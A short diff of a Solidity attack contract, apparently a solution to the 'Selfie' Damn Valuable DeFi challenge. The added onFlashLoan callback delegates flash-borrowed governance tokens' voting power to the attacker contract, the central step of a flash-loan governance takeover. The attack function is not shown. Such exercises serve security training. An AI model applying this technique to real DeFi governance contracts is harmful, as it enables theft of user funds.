@@ -14,7 +14,8 @@ contract AttackSelfie {
     SelfiePool pool;
     SimpleGovernance governance;
     DamnValuableVotes damnValuableToken;
-    
+    bytes32 CALL_BACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
     constructor(
         address _selfiePool,
         address _governance,
@@ -23,6 +24,19 @@ contract AttackSelfie {
         pool = SelfiePool(_selfiePool);
         governance = SimpleGovernance(_governance);
         damnValuableToken = DamnValuableVotes(_token);
+    }
+
+    function onFlashLoan(
+        address borrower,
+        address token,
+        uint256 amount, 
+        uint256 fee,
+        bytes calldata data
+    ) external returns(bytes32) {
+        damnValuableToken.delegate(address(this));
+
+
+        return CALL_BACK_SUCCESS;
     }
 
     function attack(address recovery) external {
